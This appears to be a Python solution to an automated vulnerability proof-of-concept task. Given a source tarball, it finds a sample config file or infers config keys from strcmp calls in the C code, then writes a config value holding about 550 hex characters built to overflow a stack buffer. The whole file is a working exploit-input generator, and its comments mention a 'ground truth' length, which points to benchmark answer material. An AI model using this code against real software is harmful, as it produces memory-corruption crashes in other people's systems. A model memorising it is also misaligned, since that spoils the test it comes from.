import tarfile
import tempfile
import os
import re
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        tmp_dir = tempfile.mkdtemp()
        try:
            # Extract the source code
            with tarfile.open(src_path) as tar:
                tar.extractall(tmp_dir)
            
            config_data = b""
            
            # Strategy 1: Look for an example config file to use as a template
            # This helps in identifying the expected format (key-value, separators, etc.)
            for root, dirs, files in os.walk(tmp_dir):
                for f in files:
                    if f.endswith(('.conf', '.cfg', '.ini', '.sample', '.example')):
                        try:
                            with open(os.path.join(root, f), 'rb') as cf:
                                content = cf.read()
                                # Check if the file contains a hex-like value (0x... or #...)
                                if re.search(rb'(0x[0-9a-fA-F]+|#[0-9a-fA-F]+)', content):
                                    config_data = content
                                    break
                        except:
                            continue
                if config_data:
                    break
            
            # Define the payload
            # The ground truth length is 547 bytes. A standard stack buffer is likely 512 bytes.
            # We need a hex string long enough to overflow.
            # '41' repeated corresponds to the ASCII representation of bytes if decoded, 
            # and is valid hex digits ('4' and '1').
            # We aim for a payload string of ~550 bytes.
            padding_len = 275 # 275 * 2 = 550 bytes
            padding = b"41" * padding_len
            
            if config_data:
                # Replace the existing hex value with our overflow payload
                match = re.search(rb'(0x[0-9a-fA-F]+|#[0-9a-fA-F]+)', config_data)
                if match:
                    original_val = match.group()
                    # Preserve prefix style (0x or #)
                    prefix = original_val[:2] if original_val.startswith(b'0x') else original_val[:1]
                    
                    new_val = prefix + padding
                    
                    # Replace only the first occurrence to be safe
                    return config_data.replace(original_val, new_val, 1)
            
            # Strategy 2: If no config found, infer keys from C source code
            keys = []
            for root, dirs, files in os.walk(tmp_dir):
                for f in files:
                    if f.endswith('.c'):
                        try:
                            with open(os.path.join(root, f), 'r', errors='ignore') as src_file:
                                src = src_file.read()
                                # Find string literals compared using strcmp/strcasecmp
                                found = re.findall(r'str(?:case)?cmp\s*\(\s*\w+\s*,\s*"([^"]+)"\s*\)', src)
                                keys.extend(found)
                                found_rev = re.findall(r'str(?:case)?cmp\s*\(\s*"([^"]+)"\s*,\s*\w+\s*\)', src)
                                keys.extend(found_rev)
                        except:
                            pass
            
            # Choose a likely configuration key
            target_key = b"value"
            if keys:
                # Prioritize keys that sound like they hold data
                priority = ['color', 'hex', 'data', 'config', 'addr', 'address', 'bg', 'fg']
                for k in keys:
                    if k.lower() in priority:
                        target_key = k.encode()
                        break
                else:
                    target_key = keys[0].encode()
            
            # Fallback format: key = 0x...
            # This covers "key=value", "key = value", etc.
            return target_key + b" = 0x" + padding + b"\n"

        except Exception:
            # Absolute fallback if analysis fails
            return b"0x" + b"41" * 275
            
        finally:
            shutil.rmtree(tmp_dir)